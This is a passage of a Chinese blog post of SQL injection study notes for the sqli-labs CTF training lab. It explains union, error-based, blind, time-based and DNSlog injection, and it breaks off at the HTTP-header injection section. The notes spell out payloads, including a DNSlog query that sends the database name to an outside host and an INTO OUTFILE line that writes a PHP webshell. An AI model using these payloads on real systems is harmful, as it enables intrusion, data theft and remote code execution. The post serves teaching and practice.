@@ -1,0 +1,1137 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.acf86bec8f1585feebb4a7bc424e2c509abd0c84c974075fb9eee923b2c62b39.js" integrity="sha256-rPhr7I8Vhf7rtKe8Qk4sUJq9DITJdAdfue7pI7LGKzk=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SQL注入——sqli-labs学习笔记 - xiaochai_123的小窝</title>
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-16x16.png?version=10de02cdc53ad46a103b64b869070266" sizes="16x16">
+    <link rel="icon" href="https://xiaochai-123.github.io/images/icons/icon-32x32.png?version=f1747f8c31b6821777c3a0956b5ba0db" sizes="32x32">
+    <link rel="icon" href="/favicon_hu_1fce3f16494f6ae3.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_f105fae78c239d0f.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_af357fe99fc0195a.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1"><link rel="icon" href="https://xiaochai-123.github.io/images/icons/favicon.ico?version=13a0b7f517ed6605fd5fc54b37b8552d">
+<meta name="keywords" content="" />
+  <meta name="description" content="sql注入学习笔记" />
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://xiaochai-123.github.io/images/SQL1.png">
+  <meta name="twitter:title" content="SQL注入——sqli-labs学习笔记">
+  <meta name="twitter:description" content="sql注入学习笔记">
+<meta property="og:url" content="https://xiaochai-123.github.io/posts/sqli-labs/">
+  <meta property="og:site_name" content="xiaochai_123的小窝">
+  <meta property="og:title" content="SQL注入——sqli-labs学习笔记">
+  <meta property="og:description" content="sql注入学习笔记">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-12-22T07:19:55+08:00">
+    <meta property="article:modified_time" content="2025-12-22T07:19:55+08:00">
+    <meta property="article:tag" content="SQL">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web">
+    <meta property="og:image" content="https://xiaochai-123.github.io/images/SQL1.png">
+
+  <meta itemprop="name" content="SQL注入——sqli-labs学习笔记">
+  <meta itemprop="description" content="sql注入学习笔记">
+  <meta itemprop="datePublished" content="2025-12-22T07:19:55+08:00">
+  <meta itemprop="dateModified" content="2025-12-22T07:19:55+08:00">
+  <meta itemprop="wordCount" content="543">
+  <meta itemprop="image" content="https://xiaochai-123.github.io/images/SQL1.png">
+  <meta itemprop="keywords" content="SQL,CTF,Web">
+  <meta property="og:image:alt" content="SQL注入——sqli-labs学习笔记" />
+  <meta name="twitter:image:alt" content="SQL注入——sqli-labs学习笔记" />
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.5e43b1a2119e65d96e086e7147d978bfdbb1033637f8262ecddbd3fbaee298c1.css" integrity="sha256-XkOxohGeZdluCG5xR9l4v9uxAzY3+CYuzdvT+67imME=" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+
+<link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/all.min.css">
+  </head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-lg">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://xiaochai-123.github.io/">
+    <picture><img class="logo " alt="Logo" src="https://xiaochai-123.github.io/images/logo.png?v=166cbf8ee66ab6626f3f85db1fb49313" loading="lazy" width="2048" height="2048" />
+</picture>
+xiaochai_123的小窝
+</a>
+
+    <div class="offcanvas-lg offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">xiaochai_123的小窝</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-lg-0">
+        <hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/posts/">Posts
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/categories/">Categories
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/tags/">Tags
+            </a>
+          </li><li class="nav-item col-6 col-lg-auto">
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://xiaochai-123.github.io/friends/">Friends
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-lg-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="Search"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-lg-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-lg-none">Palette</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="Blue"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="Blue Gray"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="Brown"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="Cyan"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="Green"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="Indigo"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="Orange"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="Pink"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="Purple"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="Red"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="Teal"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="Yellow"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-lg-auto">
+    <a class="nav-link px-0 py-2 px-lg-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-lg-none">Mode</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> Light
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> Dark
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> Auto
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.6a1fd2a99f6ad87b4aa9b7ed0f10344d4273d92cc29a6fb2cf05c463ec57ce39.js" integrity="sha256-ah/SqZ9q2HtKqbftDxA0TUJz2SzCmm&#43;yzwXEY&#43;xXzjk=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body pb-0">
+    <ol class="hbs-breadcrumb breadcrumb flex-nowrap"><li class="breadcrumb-item text-surface"><a href="/">Home</a></li><li class="breadcrumb-item text-surface"><a href="/posts/">Posts</a></li><li class="breadcrumb-item active">SQL注入——sqli-labs学习笔记</li></ol>
+  </div>
+</nav><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="Contents">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="Contents">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="Comments">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xl-block" role="button" title="Toggle sidebar">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">SQL注入——sqli-labs学习笔记</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="created on 2025-12-22 07:19:55 &#43;0800 CST.">December 22, 2025</span><span class="post-reading-time me-1 mb-1">3 min read</span><a href="/categories/ctf%E7%AC%94%E8%AE%B0/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>CTF笔记</a><a href="/tags/ctf/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">CTF</a><a href="/tags/sql/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">SQL</a><a href="/tags/web/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">Web</a>
+</div>
+
+      <p class="lead mb-3 text-body-emphasis">sql注入学习笔记</p>
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">Contents</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h1 id="sql注入sqli-labs学习笔记" data-numberify>SQL注入——sqli-labs学习笔记<a class="anchor ms-1" href="#sql注入sqli-labs学习笔记"></a></h1>
+<p>我是边看b站重庆橘子科技的视频边学的，陈腾师傅讲得很好，推荐</p>
+<pre tabindex="0"><code>https://www.bilibili.com/video/BV1c34y1h7So/?p=7&amp;share_source=copy_web&amp;vd_source=9c22157b2c924857f42d806788cc5fea
+</code></pre><hr>
+
+<h2 id="union注入" data-numberify>Union注入<a class="anchor ms-1" href="#union注入"></a></h2>
+<p><picture><img class="img-fluid " alt="msedge_yEllTDmkjW" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_yEllTDmkjW.png?v=09bfda9fddc93fac2c87312aac6ebd94" loading="lazy" width="1745" height="1079" />
+</picture>
+
+</p>
+<p>登入后我们看到提示可以传入id，我们传入就能看到对应id的user和password。</p>
+<p>一般来讲，我们需要判断题目为字符型注入还是数字型注入，这里借用几张老师的PPT</p>
+<p><picture><img class="img-fluid " alt="msedge_xZKLMRW9Rx" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_xZKLMRW9Rx.png?v=a0ea5383364828d7364730585fd0ac5b" loading="lazy" width="1597" height="856" />
+</picture>
+
+</p>
+<p><picture><img class="img-fluid " alt="msedge_FapzDjjfSs" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_FapzDjjfSs.png?v=66ffa7d54c1aa87c6dfcc2b1711dd50f" loading="lazy" width="1178" height="689" />
+</picture>
+
+</p>
+<p>小技巧，如果id=2和id=2-1的回显是一样的，说明是字符型注入。否则是数字型注入</p>
+<p><picture><img class="img-fluid " alt="msedge_pS3yOqh3DT" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_pS3yOqh3DT.png?v=53a0d08a193ed341df82f1adefe911f3" loading="lazy" width="1380" height="733" />
+</picture>
+
+</p>
+<p>在UNION注入场景下，由于页面只回显第一行数据，我们可以将注入数据的<code>id</code>字段设置为0或一个负值，使其在原表中不存在，这样页面就会显示我们注入的数据。同时，也可以在需要回显的位置填写如<code>database()</code>、<code>version()</code>等函数，以获取数据库的信息。</p>
+<p>老师给出的板书<picture><img class="img-fluid " alt="msedge_oEaGgCNcvf" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_oEaGgCNcvf.png?v=37bc2d5d9224384ffc9c916412b4580f" loading="lazy" width="1067" height="213" />
+</picture>
+
+</p>
+<p>sql数据库里面存在一个<strong>information_schema</strong>数据库，里面含有<strong>COLUMS</strong>表和<strong>TABLES</strong>表包含了所有数据库里面的信息，在这里通过<code>group_concat</code>和查询就能获取到当前数据库的表名</p>
+<p>比如<code>username=1’union select 1,2,group_concat(table_name) from information_schema.t</code>
+<code>ables where table_schema=database()#&amp;password=1</code></p>
+<blockquote>
+<p>点 (.) 用于分隔 information_schema 和 tables。 这是一种标准命名约定，遵循 SQL 标准。 它表示 tables 是 information_schema 命名空间下的一个对象，就像 mydb.mytable 表示 mytable 表属于 mydb 数据库一样。</p>
+</blockquote>
+
+<h2 id="报错注入" data-numberify>报错注入<a class="anchor ms-1" href="#报错注入"></a></h2>
+<p><picture><img class="img-fluid " alt="msedge_m4Xts1eDSA" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_m4Xts1eDSA.png?v=7db64a0bcf335cc1342adee28a779f13" loading="lazy" width="1051" height="519" />
+</picture>
+
+</p>
+<p>如图所示，当我们正常进行查询时，不会有回显，只显示You are in&hellip;</p>
+<p>当我们故意输错database,比如打成datadase，题目回显<code>FUNCTION security.datadase does not exist</code></p>
+<p>我们就通过报错得到信息：当前数据库名为<strong>security</strong></p>
+
+<h3 id="extractvalue报错注入" data-numberify>extractValue()报错注入<a class="anchor ms-1" href="#extractvalue报错注入"></a></h3>
+<p><picture><img class="img-fluid " alt="msedge_Ns4usLKA7M" src="https://xiaochai-123.github.io/images/screenshoots/2025-12/msedge_Ns4usLKA7M.png?v=ea298dd78dd60200cd53236c5baf1541" loading="lazy" width="1473" height="888" />
+</picture>
+
+</p>
+<p><strong>extractvalue(XML_document,Xpath_string)</strong></p>
+<blockquote>
+<p><strong>XML_doucument</strong>是string格式，为XML文档对象的名称，例如Doc</p>
+<p><strong>XPath_string</strong>是路径，XPath格式的字符串</p>
+</blockquote>
+<p>在数据库当中插入这些xml内容</p>
+<p>如图创建了ctfstu数据库，并且在库里面创建了xml表</p>
+<p>输入命令<code>select extractvalue(doc,'/book/author/surname') from xml;</code></p>
+<p>这里的doc为列名，第二部分<code>/book/author/surname</code>为查询路径</p>
+<p>可以查询到这样的结构：</p>
+<table>
+  <thead>
+      <tr>
+          <th>extractvalue(doc,&rsquo;/book/author/surname')</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>benben</td>
+      </tr>
+      <tr>
+          <td>Melton</td>
+      </tr>
+  </tbody>
+</table>
+<p>那么怎么进行报错注入呢？当我们只是输错路径名时，比如<code>/book/authorr</code>，则只会查询不到内容，而不会报错</p>
+<p>我们发现<code>extractvalue</code>对路径比较敏感，当路径符号出错时，会出现错误信息</p>
+<p>比如：当路径为<code>'~book/title'</code>时</p>
+<p>会显示类似的报错信息：<code>ERROR 1105 (HY000): XPATH syntax error: '~book/title'</code></p>
+<p>于是，想到：如果我们在报错之前先执行SELECT查询语句，从而在报错内容中回显我们想要的内容？</p>
+<p>构建语句：<code>select extractvalue(doc,concat(0x7e,(select database()))) from xml;</code></p>
+<blockquote>
+<p>这里的<code>0x7e</code> 是十六进制表示的字符 &lsquo;<code>~</code>&rsquo;，我们用<code>concat</code>把<code>~</code>和数据库名拼接在一起，就构建了非法路径。(<code>btw，group_concat()</code>用于把查询到的结果合并到一行显示)</p>
+</blockquote>
+<p>回显出<code>ERROR 1105 (HY000): XPATH syntax error: '~ctfstu'</code>于是我们得到库名ctfstu</p>
+<p>当报错信息长度有限制时，可以用<code>substring</code>来截取。</p>
+
+<h3 id="updatexml报错注入" data-numberify>Updatexml报错注入<a class="anchor ms-1" href="#updatexml报错注入"></a></h3>
+<p>原理同上，函数**updatexml(XML_document,XPath_string,new_value)**包含三个参数</p>
+<p><strong>XML_doucument</strong>是string格式，为XML文档对象的名称，例如Doc</p>
+<p><strong>XPath_string</strong>是路径，XPath格式的字符串</p>
+<p><strong>new_value，string</strong>格式，替换查找到的符合条件的数据</p>
+<p>同extractvalue()，输入错误的路径（更改路径符号）</p>
+<p>正常句式：<strong>select updatexml(doc,&rsquo;/book/auther/surname&rsquo;,&lsquo;1&rsquo;) from xml;</strong></p>
+<p>错误句式：<strong>select updatexml(doc,&rsquo;~book/auther/surname&rsquo;,&lsquo;1&rsquo;) from xml;</strong></p>
+<p>就能成功注入出库名</p>
+
+<h3 id="floor报错注入" data-numberify>floor报错注入<a class="anchor ms-1" href="#floor报错注入"></a></h3>
+<p>floor报错是最麻烦的报错</p>
+<blockquote>
+<p>rand()函数：随机返回0~1之间的小鼠</p>
+<p>floor()函数：小数向下取整数。</p>
+<p>ceiling()：向上取整</p>
+<p>concat_ws()：将括号内数据用第一个字段连接起来</p>
+<p>count()：汇总统计数量</p>
+<p>limit：这里用来显示指定行数</p>
+</blockquote>
+<p>floor报错示例：</p>
+<p><strong>?id=0&rsquo; union select 1,count(*),<em>concat_ws(&rsquo;-&rsquo;,(select concat(&rsquo;~&rsquo;,id,username,&rsquo;:&rsquo;,password) from users limit 0,1),floor(rand(0)2))</em> as a information_chema.tables group by a &ndash;+</strong></p>
+<p>看着有点头疼，先来理解一下各个函数</p>
+<p>当我们<code>select rand() from users;</code>的时候，我们users表里面有多少行，他就会显示出多少行的随机数。</p>
+<p><code>select floor(rand()*2);</code> 的返回值不是0就是1</p>
+<p><code>select concat_ws('~',2,3);</code> 会回显2~3</p>
+<p>那我们<code>select concat_ws('~',(select database()),floor(rand*2)) from users;</code></p>
+<p>就会回显出类似这样的表：</p>
+<table>
+  <thead>
+      <tr>
+          <th>concat_ws(&rsquo;~&rsquo;,(select database()),floor(rand*2))</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>security~1</td>
+      </tr>
+      <tr>
+          <td>security~0</td>
+      </tr>
+      <tr>
+          <td>security~1</td>
+      </tr>
+      <tr>
+          <td>security~1</td>
+      </tr>
+      <tr>
+          <td>security~0</td>
+      </tr>
+  </tbody>
+</table>
+<p>在上面的示例中，as a的意思就是把这些信息分成两组，分别是1结尾一组和0结尾一组。</p>
+<table>
+  <thead>
+      <tr>
+          <th>a</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>security~1</td>
+      </tr>
+      <tr>
+          <td>security~0</td>
+      </tr>
+  </tbody>
+</table>
+<p>再用count()进行计数，两组内容分别出现多少次。</p>
+<p>当我们把rand()的小括号内输入数字，就会出现固定的01格式。(为了稳定出现报错)</p>
+<p>那么，我们上面示例的报错注入原理就是：<strong>rand()函数进行group by分组和count统计时可能会多次执行，导致键值key重复</strong></p>
+<p>简单来说，我们*<em>floor(rand(0)<em>2)的结果是0 1 1 0 1&hellip;</em></em></p>
+<p>那么第一次统计：第一次计算会得到security-0，当它想计数的时候，实际上<strong>并不是</strong>把security-0复制为键值然后计数器+1</p>
+<table>
+  <thead>
+      <tr>
+          <th>group_key</th>
+          <th>count()</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>security-0</td>
+          <td>1</td>
+      </tr>
+  </tbody>
+</table>
+<p>而是，它再计算一次，将第二次计算得到的键值存入。(因为第二次就floor出来的值就变成了1)，所以<strong>真实情况下</strong>是这样的：</p>
+<table>
+  <thead>
+      <tr>
+          <th>group_key</th>
+          <th>count()</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>security-1</td>
+          <td>1</td>
+      </tr>
+  </tbody>
+</table>
+<p>当继续计算的时候，第二次统计会得到security-1，表里有这个键值，使得计数器加一(第三个floor值是1)</p>
+<table>
+  <thead>
+      <tr>
+          <th>group_key</th>
+          <th>count()</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>security-1</td>
+          <td>2</td>
+      </tr>
+  </tbody>
+</table>
+<p>继续计算，会得到security-0，(都四个floor值为0)没有这个键名，所以再计算一次加入键值</p>
+<p>但是问题出现了，程序要把我们第五次计算出来的名写入group_key列，但是第五次得到的结果是security-1，结果报错，key已存在！</p>
+<p>ERROR:Duplicat entyr &lsquo;security=1&rsquo; for key &lsquo;&lt;group_key&gt;&rsquo;</p>
+<p>所以我们如果不把rand()设为定值的话，它的报错并不稳定。在一般情况下我们选择行数比较多的表比如information_schema.tables作为from来使得出现报错的可能性更大。</p>
+<p>所以我们得到库名security。</p>
+
+<h2 id="盲注" data-numberify>盲注<a class="anchor ms-1" href="#盲注"></a></h2>
+<p>页面没有回显位，也没有报错，但是有真假两种状态时，我们就可以使用盲注</p>
+
+<h3 id="布尔盲注" data-numberify>布尔盲注<a class="anchor ms-1" href="#布尔盲注"></a></h3>
+<p>比如less-8中，如果我们注入id=1 ’ and 1=0 &ndash;+无回显，当输入id=1 ’ and 1=1 &ndash;+时会回显You are in &hellip;</p>
+<p>我们可以使用ascii()把字母转化为数字，以页面的真假来判断每一位字母。(ascii如果处理多个字母时，只会处理第一个字母)</p>
+<p>比如<code>?id=1' and ascii(substr((select database()),1,1))&gt;= 100 --+</code></p>
+<p>观察页面回显，如果为true则数据库名第一个字符的ascii码大于等于100。false则小于100</p>
+<p>这里利用二分法最终找到第一个字母的ascii码。</p>
+<p>此时我们再把?id=1&rsquo; and ascii(substr((select database()),<strong>2</strong>,1))&gt;= 100 &ndash;+</p>
+<p>使用substr让他从第二个字符开始，就可以进行第二个字符的判断。</p>
+<p>这样我们就可以一步一步地把要得到的信息注入出来。</p>
+
+<h3 id="时间盲注" data-numberify>时间盲注<a class="anchor ms-1" href="#时间盲注"></a></h3>
+<p>页面只返回一个正常页面，利用页面响应时间不同来猜数据</p>
+<p>函数<strong>sleep(n)</strong>：使得页面休眠n秒再进行反馈</p>
+<p>select if(1=2, sleep(0), sleep(3));语句的含义为：如果1=2，那么执行sleep(0)，如果1!=2,那么执行sleep(3)</p>
+<p>所以我们就得到这样的注入语句：</p>
+<p><strong>select if (ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3));</strong></p>
+<p>原理同上</p>
+
+<h3 id="dnslog注入" data-numberify>DNSlog注入<a class="anchor ms-1" href="#dnslog注入"></a></h3>
+<blockquote>
+<p>DNSlog也属于盲注的一种</p>
+</blockquote>
+
+<h4 id="手动注入" data-numberify>手动注入<a class="anchor ms-1" href="#手动注入"></a></h4>
+<p><strong>select load_file(&ldquo;var/www/html/test.txt&rdquo;);</strong></p>
+<p>我们可以使用load_file来读取文件(可能需要开放权限)</p>
+<blockquote>
+
+<h4 id="unc路径" data-numberify>UNC路径<a class="anchor ms-1" href="#unc路径"></a></h4>
+<blockquote>
+<p>（Universal Naming Convention，通用命名约定）路径是一种用于访问网络共享资源的路径格式，主要用于 Windows 系统。</p>
+</blockquote>
+<p>格式：\\servername\sharename，其中servername是服务器名，sharename是共享文件夹名称</p>
+<p>我们就可以通过UNC路径来访问网络上的共享文件</p>
+</blockquote>
+<p>那么我们所谓的DNSlog是什么呢，比如</p>
+<p><strong>select load_file(&quot;//security.com/123/test.txt&quot;);</strong></p>
+<p>我们可以将这个域名被DNS解析产生的日志记录到服务器上，然后查看这个日志</p>
+<p>比如我们在DNSlog随便注册一个域名<strong>ryw4a6.dnslog.cn</strong></p>
+<p>我们可以构建如下payload：</p>
+<p><strong>?id=1&rsquo; and (select load_file(//(select database()).ryw4a6.dnsload.cn/benben.txt))) &ndash;+</strong></p>
+<p>我们没有用双引号包裹。因为我们要让select database()先执行，给它添加了一个小括号。但是我们在加上双引号只后，里面的指令就会失效。所以我们要使用concat把指令拼接起来，所以上面那个payload其实是<strong>假的</strong>（</p>
+<p>所以我们应该这样做：</p>
+<p><strong>?id=1&rsquo; and (select load_file(concat(&quot;//&quot;,(select database()),&quot;.ryw4a6.dnsload.cn/benben.txt&quot;))) &ndash;+</strong></p>
+<p>所以服务器会去尝试访问这个路径，其实并没有这个路径。我们这时候去DNSlog.cn网站查看DNS Query Record，就会发现有一条来自security.ryw4a6.dnslog.cn的域名请求解析。我们就拿到了数据库名为security</p>
+
+<h4 id="自动注入" data-numberify>自动注入<a class="anchor ms-1" href="#自动注入"></a></h4>
+<p>我们可以利用CEYE网站和Github上的DnslogSqlinj工具来进行自动化注入</p>
+<p>在使用工具时，把DnslogSqlinj的config文件修改为我们自己的域名。善用AI，配置自动化工具。不再多讲</p>
+
+<h2 id="sql注入文件上传" data-numberify>sql注入文件上传<a class="anchor ms-1" href="#sql注入文件上传"></a></h2>
+<p><strong>show variable like &lsquo;%secure%&rsquo;;</strong> 可以用来查看上传文件的权限，回显样例如下：</p>
+<table>
+  <thead>
+      <tr>
+          <th>Variable_name</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>require_secure_transport</td>
+          <td>OFF</td>
+      </tr>
+      <tr>
+          <td>secure_auth</td>
+          <td>ON</td>
+      </tr>
+      <tr>
+          <td>secure_file_priv</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<p>第三个值为空意味着整个硬盘的路径都可以读取。也就是说这里是可读写的路径。NULL为不可读写</p>
+<p><strong>into outfile</strong> 命令可以将一个文件写入到服务器中。</p>
+<p>比如我们可以传入一个一句话木马：(此处为less-7的独特闭合方式)</p>
+<p><code>?id=-1')) union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;/var/www/html/shell.php</code></p>
+<p>就可能可以RCE服务器，拿到flag。</p>
+
+<h2 id="post注入" data-numberify>POST注入<a class="anchor ms-1" href="#post注入"></a></h2>
+<p>换汤不换药。注意POST传参与GET不同的特性即可。（比如：POST没有长度限制，可以传输大量数据、HEX，例如文件上传、用户敏感信息。数据在请求体中传输，不会出现在 URL 中，因此更安全，适合传输敏感信息。）</p>
+
+<h2 id="http头注入报头注入" data-numberify>HTTP头注入(报头注入)<a class="anchor ms-1" href="#http头注入报头注入"></a></h2>
+<p>页面看不到明显变化，找不到注入点，post注入时，万能密码admin&rsquo;or 1=1无法绕过验证，用户名无法注入，可以尝试报头注入</p>
+<p>//唉，好累让AI写了先。具体见到题再放到Guide篇里面精讲。</p>
+
+<h3 id="user-agent-注入uagent-注入" data-numberify>User-Agent 注入（UAgent 注入）<a class="anchor ms-1" href="#user-agent-注入uagent-注入"></a></h3>
+
+<h4 id="1-原理说明" data-numberify>1. 原理说明<a class="anchor ms-1" href="#1-原理说明"></a></h4>
